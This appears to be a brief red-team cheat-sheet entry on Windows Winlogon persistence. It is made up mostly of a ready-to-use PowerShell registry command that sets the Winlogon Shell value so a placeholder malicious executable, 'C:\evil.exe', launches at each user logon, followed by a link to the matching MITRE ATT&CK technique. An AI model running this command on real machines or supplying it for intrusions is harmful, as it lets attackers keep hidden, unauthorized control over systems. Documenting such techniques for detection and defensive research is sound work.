# WinLogon Persistence

Executing the following command as `Administrator`, the malicious executable will be executed when logon.

```powershell
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, C:\evil.exe" /f
```

## Resources

- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1547/004/)